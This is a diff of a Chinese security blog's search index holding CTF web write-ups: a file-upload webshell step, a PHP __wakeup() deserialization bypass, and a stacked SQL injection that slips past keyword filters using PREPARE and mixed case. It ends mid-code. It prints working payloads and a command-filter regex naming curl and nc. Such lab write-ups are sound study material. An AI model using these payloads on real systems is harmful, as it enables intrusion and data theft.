+<p>后端也有限制, 传统艺能, 改后缀为<code>phtml</code></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012120107.png"
+alt="image-20211101212015986" />
+<figcaption aria-hidden="true">image-20211101212015986</figcaption>
+</figure>
+<p>文件直接上传成功, 接下来就是菜刀时间</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012121920.png"
+alt="image-20211101212139849" />
+<figcaption aria-hidden="true">image-20211101212139849</figcaption>
+</figure>
+<p><strong>flag</strong>就在根目录</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP的__wakeup()函数漏洞</title>
+    <url>/2023/04/06/%5BWeb%5DPHP%E7%9A%84__wakeup()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p><code>unserialize()</code> 反序列化一个对象时,
+会检查对象是否存在一个<code>__wakeup()</code>方法,
+如果有则先调用它进行反序列化前的准备工作, 例如重新建立数据库连接,
+或执行其它初始化操作.</p>
+<p>官方示例:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$db</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$db</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;server = <span class="variable">$server</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$this</span>-&gt;server, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$this</span>-&gt;db, <span class="variable">$this</span>-&gt;link);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;db&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当被反序列化的字符串中表示的对象属性个数大于对象实际的个数时,
+<code>__wakeup()</code>将被跳过执行.</p>
+<p>实验:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	<span class="comment">//test.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wake Up!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ABC</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$i</span>);</span><br><span class="line">	<span class="comment">//输出为</span></span><br><span class="line">	<span class="comment">//O:3:&quot;ABC&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>改一下代码 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	<span class="comment">//test.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wake Up!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>把刚才的<code>O:3:"ABC":2:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;</code>带入参数<code>str</code>中请求</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062320038.png"
+alt="image-20230406231932410" />
+<figcaption aria-hidden="true">image-20230406231932410</figcaption>
+</figure>
+<p>反序列化触发了<code>__wakeup()</code>方法,
+绕过只需要对属性个数进行修改</p>
+<p>修改前:<code>O:3:"ABC":2:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;</code></p>
+<p>修改后:<code>O:3:"ABC":3:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;</code></p>
+<p>也就是从2个属性改成3个属性.</p>
+<blockquote>
+<p>更改属性数量导致与实际数量不符会导致反序列化失败,
+但是<code>unserialize()</code>会将遇到错误之前能填充的属性都填充上,
+遇到错误之后再执行<code>__destruct()</code>将构造到一半的对象析构,
+并返回一个<code>false</code>.
+所以在<code>__destruct()</code>方法里可以正常访问已经被填充的属性.</p>
+</blockquote>
+<p>接下来是一道CTF题</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="variable language_">$this</span>-&gt;cmd`;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>考点就是绕过<code>__wakeup()</code>, 首先生成<code>Payload</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;data.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>), <span class="title function_ invoke__">serialize</span>(<span class="variable">$i</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问一下, 查看<code>data.bin</code>文件</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304070008126.png"
+alt="image-20230407000850092" />
+<figcaption aria-hidden="true">image-20230407000850092</figcaption>
+</figure>
+<p>仔细看的话可以发现,
+<code>*</code>的两边都各有一个<code>\x00</code>字节,
+但是这在文本上是显示不出来的,
+这也是为什么采用写入文件再查看这种麻烦的方式而不采用<code>echo</code>直接浏览器查看.</p>
+<p>所以构造<code>Payload</code>的时候要采用<code>%00</code>把<code>\x00</code>字节补上去.</p>
+<p>所以<code>Payload</code>就是:
+<code>O:3:"ctf":3:&#123;s:11:"%00*%00username";s:5:"admin";s:6:"%00*%00cmd";s:2:"ls";&#125;</code></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304070019586.png"
+alt="image-20230407001903508" />
+<figcaption aria-hidden="true">image-20230407001903508</figcaption>
+</figure>
+<p>因为<code>cat</code>被过滤了, 所以用<code>tac</code>就可以了</p>
+<p>最终<code>Payload</code>:
+<code>O:3:"ctf":3:&#123;s:11:"%00*%00username";s:5:"admin";s:6:"%00*%00cmd";s:12:"tac flag.php";&#125;</code></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+        <tag>PHP反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[RoarCTF 2019]Easy Calc 1</title>
     <url>/2021/11/01/%5BWeb%5DRoarCTF-2019-Easy-Calc-1/</url>
     <content><![CDATA[<p>进来就是一个普通的计算器, 输入表达式给出结果,先看一波源代码</p>
@@ -1356,81 +1426,6 @@ alt="image-20211101203110483" />
       <tags>
         <tag>Web安全</tag>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[强网杯 2019]随便注 1</title>
-    <url>/2021/10/29/%5BWeb%5D%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
-    <content><![CDATA[<p>查看源代码未找到有用信息, 尝试提交数字1, 返回一个数组,
-接着尝试注入<code>1' or 1;%23</code>, 成功返回三个数组,但未找到flag.</p>
-<p><img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291646793.png"
-alt="image-20211029164617724" /><img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291647411.png"
-alt="image-20211029164706347" /></p>
-<p>尝试堆叠注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;%23</span></span><br></pre></td></tr></table></figure>
-<p>查出表名,可以看到<code>words</code>和<code>1919810931114514</code>两个表</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291651805.png"
-alt="image-20211029165116741" />
-<figcaption aria-hidden="true">image-20211029165116741</figcaption>
-</figure>
-<p>堆叠注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;desc `1919810931114514`;desc `words`;%23</span></span><br></pre></td></tr></table></figure>
-<p>查出两个表的字段.</p>
-<p>观察到<code>words</code>表有两个字段<code>id</code>和<code>data</code>,
-<code>1919810931114514</code>仅有一个字段<code>flag</code>,
-猜测<strong>flag</strong>就在表<code>1919810931114514</code>中.</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291701074.png"
-alt="image-20211029170144998" />
-<figcaption aria-hidden="true">image-20211029170144998</figcaption>
-</figure>
-<p>尝试注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;select * from `1919810931114514`;%23</span></span><br></pre></td></tr></table></figure>
-<p>提示</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);, </span><br></pre></td></tr></table></figure>
-<p>得知有关键字审查</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292207097.png"
-alt="image-20211029220716039" />
-<figcaption aria-hidden="true">image-20211029220716039</figcaption>
-</figure>
-<p>采用<strong>预编译</strong>的方式绕过关键字审查, 构造注入语句:</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;EXECUTE stmt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#拆开为</span></span><br><span class="line"><span class="string">1&#x27;</span>; #闭合单引号</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span> <span class="operator">=</span> CONCAT(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect * from `1919810931114514`;&#x27;</span>); #定义变量,采用CONCAT()拼接字符串绕过审查</span><br><span class="line"><span class="keyword">prepare</span> stmt <span class="keyword">from</span> <span class="variable">@sql</span>; #预编译<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt; #执行编译完的<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292236737.png"
-alt="image-20211029223621684" />
-<figcaption aria-hidden="true">image-20211029223621684</figcaption>
-</figure>
-<p>提示</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p>有第二道关键字审查, 由于strstr区分大小写, 而set和prepare大小写不敏感,
-故更改注入语句为</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);Prepare stmt from @sql;EXECUTE stmt;</span></span><br></pre></td></tr></table></figure>
-<p>即可绕过审查, 拿到flag</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292237890.png"
-alt="image-20211029223717822" />
-<figcaption aria-hidden="true">image-20211029223717822</figcaption>
-</figure>
-<blockquote>
-<p>源代码</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;supersqli&quot;</span>);</span><br><span class="line">    <span class="comment">//多条sql语句</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>)&#123;<span class="comment">//使用multi_query()执行一条或多条sql语句</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rs</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">store_result</span>())&#123;<span class="comment">//store_result()方法获取第一条sql语句查询结果</span></span><br><span class="line">          <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">Close</span>(); <span class="comment">//关闭结果集</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">more_results</span>())&#123;  <span class="comment">//判断是否还有更多结果集</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>(<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">next_result</span>()); <span class="comment">//next_result()方法获取下一结果集，返回bool值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error &quot;</span>.<span class="variable">$mysqli</span>-&gt;errno.<span class="string">&quot; : &quot;</span>.<span class="variable">$mysqli</span>-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">//关闭数据库连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1601,7 +1596,7 @@ src="https://raw.githubusercontent.com/x2658y/static/master/images/2023040621583
 alt="image-20230406215830337" />
 <figcaption aria-hidden="true">image-20230406215830337</figcaption>
 </figure>
-<p>成功的调用了<code>pageB.php</code>里<code>Vul</code>类的<code>__wakeup()</code>函数,
+<p>成功的调用了<code>pageB.php</code>里<code>Vul</code>类的<code>__wakeup()</code>方法,
 并实现了控制对象内部变量的值.</p>
 <blockquote>
 <p>关于这个输出是怎么来的:</p>
@@ -1628,8 +1623,85 @@ Session 上传进度 - Manual</a></li>
         <category>Web</category>
       </categories>
       <tags>
-        <tag>PHP_SESSION</tag>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
         <tag>PHP反序列化</tag>
+        <tag>PHP_SESSION</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[强网杯 2019]随便注 1</title>
+    <url>/2021/10/29/%5BWeb%5D%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
+    <content><![CDATA[<p>查看源代码未找到有用信息, 尝试提交数字1, 返回一个数组,
+接着尝试注入<code>1' or 1;%23</code>, 成功返回三个数组,但未找到flag.</p>
+<p><img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291646793.png"
+alt="image-20211029164617724" /><img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291647411.png"
+alt="image-20211029164706347" /></p>
+<p>尝试堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;%23</span></span><br></pre></td></tr></table></figure>
+<p>查出表名,可以看到<code>words</code>和<code>1919810931114514</code>两个表</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291651805.png"
+alt="image-20211029165116741" />
+<figcaption aria-hidden="true">image-20211029165116741</figcaption>
+</figure>
+<p>堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;desc `1919810931114514`;desc `words`;%23</span></span><br></pre></td></tr></table></figure>
+<p>查出两个表的字段.</p>
+<p>观察到<code>words</code>表有两个字段<code>id</code>和<code>data</code>,
+<code>1919810931114514</code>仅有一个字段<code>flag</code>,
+猜测<strong>flag</strong>就在表<code>1919810931114514</code>中.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291701074.png"
+alt="image-20211029170144998" />
+<figcaption aria-hidden="true">image-20211029170144998</figcaption>
+</figure>
+<p>尝试注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;select * from `1919810931114514`;%23</span></span><br></pre></td></tr></table></figure>
+<p>提示</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);, </span><br></pre></td></tr></table></figure>
+<p>得知有关键字审查</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292207097.png"
+alt="image-20211029220716039" />
+<figcaption aria-hidden="true">image-20211029220716039</figcaption>
+</figure>
+<p>采用<strong>预编译</strong>的方式绕过关键字审查, 构造注入语句:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;EXECUTE stmt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#拆开为</span></span><br><span class="line"><span class="string">1&#x27;</span>; #闭合单引号</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span> <span class="operator">=</span> CONCAT(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect * from `1919810931114514`;&#x27;</span>); #定义变量,采用CONCAT()拼接字符串绕过审查</span><br><span class="line"><span class="keyword">prepare</span> stmt <span class="keyword">from</span> <span class="variable">@sql</span>; #预编译<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt; #执行编译完的<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292236737.png"
+alt="image-20211029223621684" />
+<figcaption aria-hidden="true">image-20211029223621684</figcaption>
+</figure>
+<p>提示</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>有第二道关键字审查, 由于strstr区分大小写, 而set和prepare大小写不敏感,
+故更改注入语句为</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);Prepare stmt from @sql;EXECUTE stmt;</span></span><br></pre></td></tr></table></figure>
+<p>即可绕过审查, 拿到flag</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292237890.png"
+alt="image-20211029223717822" />
+<figcaption aria-hidden="true">image-20211029223717822</figcaption>
+</figure>
+<blockquote>
+<p>源代码</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; 